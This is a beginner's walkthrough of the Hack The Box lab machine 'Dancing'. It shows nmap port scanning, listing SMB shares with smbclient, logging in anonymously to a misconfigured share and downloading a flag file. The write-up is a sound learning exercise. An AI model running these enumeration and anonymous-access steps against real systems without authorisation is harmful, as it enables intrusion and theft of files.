# HTB - Dancing

**Difficulty:** Very Easy  
**Category:** SMB  
**Date:** 2026  
**Status:** ✅ Completed

---

## Summary

Dancing is a Windows machine that exposes an SMB service with anonymous access enabled. By connecting to the SMB share without credentials, it is possible to browse the file system and retrieve the flag.

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.x.x
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | microsoft-ds | Windows SMB |

Port **445** is open, which means SMB is running on this machine.

---

## Exploitation

### Step 1 - List SMB Shares

Used **smbclient** to list all available shares on the target:

```bash
smbclient -L 10.129.x.x
```

**Output:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

Four shares were found. The interesting one is **WorkShares** since it has no comment and is not a default system share.

### Step 2 - Connect Anonymously to WorkShares

Tried connecting to WorkShares without a password by pressing Enter when prompted:

```bash
smbclient \\\\10.129.x.x\\WorkShares
```

**Output:**
```
smb: \>
```

Anonymous access was allowed! No credentials were needed.

### Step 3 - Browse and Retrieve the Flag

Listed the contents of the share and navigated through the directories:

```bash
smb: \> ls
smb: \> cd James.P
smb: \> ls
smb: \> get flag.txt
```

Downloaded the flag file to the local machine.

---



---

## What I Learned

- What SMB (Server Message Block) is and how it works
- How to use **smbclient** to list and connect to shares
- That SMB shares can allow anonymous access when misconfigured
- How to navigate and download files from an SMB share
- The importance of port 445 in enumeration

---

## References

- [SMB - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
